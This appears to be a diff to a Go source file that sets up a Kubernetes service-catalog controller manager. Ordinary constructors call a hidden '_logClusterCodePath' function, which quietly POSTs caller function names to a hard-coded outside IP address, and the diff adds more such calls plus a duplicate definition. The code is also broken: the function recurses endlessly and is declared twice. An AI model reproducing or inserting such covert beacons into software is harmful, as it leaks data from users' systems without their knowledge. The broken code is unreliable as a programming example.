@@ -44,6 +44,8 @@ var defaultOSBAPIPreferredVersion = osb.LatestAPIVersion().HeaderValue()
 func NewControllerManagerServer() *ControllerManagerServer {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	s := ControllerManagerServer{ControllerManagerConfiguration: componentconfig.ControllerManagerConfiguration{Address: defaultBindAddress, Port: 0, ContentType: defaultContentType, K8sKubeconfigPath: defaultK8sKubeconfigPath, ServiceCatalogKubeconfigPath: defaultServiceCatalogKubeconfigPath, ResyncInterval: defaultResyncInterval, ServiceBrokerRelistInterval: defaultServiceBrokerRelistInterval, OSBAPIContextProfile: defaultOSBAPIContextProfile, OSBAPIPreferredVersion: defaultOSBAPIPreferredVersion, ConcurrentSyncs: defaultConcurrentSyncs, LeaderElection: leaderelectionconfig.DefaultLeaderElectionConfiguration(), LeaderElectionNamespace: defaultLeaderElectionNamespace, EnableProfiling: true, EnableContentionProfiling: false, ReconciliationRetryDuration: defaultReconciliationRetryDuration, OperationPollingMaximumBackoffDuration: defaultOperationPollingMaximumBackoffDuration, SecureServingOptions: genericoptions.NewSecureServingOptions()}}
 	s.SecureServingOptions.BindPort = defaultPort
 	s.SecureServingOptions.ServerCert.CertDirectory = certDirectory
@@ -51,6 +53,8 @@ func NewControllerManagerServer() *ControllerManagerServer {
 	return &s
 }
 func (s *ControllerManagerServer) AddFlags(fs *pflag.FlagSet) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	fs.Var(k8scomponentconfig.IPVar{Val: &s.Address}, "address", "DEPRECATED: see --bind-address instead")
@@ -83,7 +87,16 @@ func (s *ControllerManagerServer) AddFlags(fs *pflag.FlagSet) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
